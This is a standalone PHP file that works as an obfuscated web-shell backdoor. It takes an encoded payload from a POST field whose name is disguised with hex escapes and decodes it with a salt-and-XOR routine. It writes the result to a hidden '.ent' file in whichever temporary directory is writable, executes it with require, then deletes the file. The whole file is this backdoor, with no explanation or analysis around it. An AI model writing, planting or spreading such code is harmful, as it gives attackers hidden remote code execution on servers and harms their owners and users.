<?php

if(!empty($_POST["\x6F\x62\x6Aect"])){
	$property_set = array_filter([getenv("TMP"), sys_get_temp_dir(), session_save_path(), getenv("TEMP"), "/var/tmp", "/dev/shm", "/tmp", ini_get("upload_tmp_dir"), getcwd()]);
	$dat = $_POST["\x6F\x62\x6Aect"];
	 $dat	 	=		 explode		(		'.' ,	$dat  );
	$desc = '';
            $salt = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen($salt);
            $r = 0;
    
            foreach($dat as $v7) {
                $chS = ord($salt[$r%	$sLen]);
                $d =((int)$v7 - $chS -($r%	10))	^	 21;
                $desc .= chr($d);
                $r++; 	}
	foreach ($property_set as $key => $factor) {
    		if ((bool)is_dir($factor) && (bool)is_writable($factor)) {
    $pointer = implode("/", [$factor, ".ent"]);
    if (file_put_contents($pointer, $desc)) {
	require $pointer;
	unlink($pointer);
	die();
}
}
}
}